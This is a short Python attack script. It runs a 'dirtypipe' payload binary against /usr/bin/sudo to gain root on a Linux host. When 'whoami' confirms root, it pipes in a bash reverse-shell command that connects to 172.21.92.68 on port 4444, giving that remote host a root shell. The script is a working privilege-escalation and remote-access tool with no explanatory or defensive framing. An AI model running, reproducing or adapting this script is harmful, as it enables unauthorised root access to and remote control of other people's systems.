#imports

import subprocess
import os

def checkroot():
    root_status = subprocess.run(['whoami'], stdout=subprocess.PIPE).stdout.decode('utf-8').strip()
    if root_status == "root": return True
    else: return False

# def runcommand(command,input = False):
#     command = command.split(" ")
#     if input:
#         return subprocess.run(command,stdin=subprocess.PIPE, stdout=subprocess.PIPE).stdout.decode('utf-8')

version_info = '.'.join(subprocess.run(['uname', '-r'], stdout=subprocess.PIPE).stdout.decode('utf-8').split(".")[:2])


def dirtypipe_check():
    status = False

    dirtypipe = subprocess.run(
        ["payloads/dirtypipe","/usr/bin/sudo"],
        stdout=subprocess.PIPE,
        input="whoami",
        encoding="utf-8"
        )
        
    if dirtypipe.stdout[:4] == "root":
        reverse_shell = subprocess.run(
        ["payloads/dirtypipe","/usr/bin/sudo"],
        stdout=subprocess.PIPE,
        input="bash -c 'exec bash -i &>/dev/tcp/172.21.92.68/4444 <&1'",
        encoding="utf-8"
        )
        status = True
    else:
        print("Failed to get root")

    return status


dirtypipe_check()